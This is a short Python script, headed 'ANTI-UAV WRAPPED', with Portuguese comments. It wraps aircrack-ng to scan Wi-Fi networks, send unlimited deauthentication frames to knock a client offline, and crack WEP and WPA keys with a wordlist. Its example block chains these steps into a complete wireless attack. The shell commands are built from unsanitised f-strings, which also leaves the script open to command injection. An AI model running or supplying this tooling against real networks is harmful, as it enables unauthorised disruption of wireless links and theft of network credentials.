#         ANTI-UAV WRAPPED
#         Version 0.1

import os, subprocess


class AircrackWrapper:
    def __init__(self, interface):
        self.interface = interface

    def scan_wifi_networks(self, output_file):
        command = f"airodump-ng --output-format csv -w {output_file} {self.interface}"
        subprocess.run(command, shell=True)

    def deauthenticate_client(self, bssid, client):
        command = f"aireplay-ng --deauth 0 -a {bssid} -c {client} {self.interface}"
        subprocess.run(command, shell=True)

    def crack_wep_key(self, bssid, wep_key):
        command = f"aircrack-ng -b {bssid} -e <ESSID> -k {wep_key} *.cap"
        subprocess.run(command, shell=True)

    def crack_wpa_key(self, capture_file, wordlist_file):
        command = f"aircrack-ng -w {wordlist_file} -b <BSSID> {capture_file}"
        subprocess.run(command, shell=True)

# Exemplo de uso
if __name__ == "__main__":
    wifi_interface = "wlan0"
    aircrack = AircrackWrapper(wifi_interface)

    # Executa a varredura de redes e captura informações
    aircrack.scan_wifi_networks("wifi_info")

    # Deautentica um cliente específico
    bssid = "<BSSID>"
    client = "<CLIENT>"
    aircrack.deauthenticate_client(bssid, client)

    # Quebra a chave WEP
    aircrack.crack_wep_key(bssid, "<WEP_KEY>")

    # Quebra a chave WPA usando um arquivo de palavras-passe (wordlist)
    capture_file = "<CAPTURE_FILE>"
    wordlist_file = "<WORDLIST_FILE>"
    aircrack.crack_wpa_key(capture_file, wordlist_file)
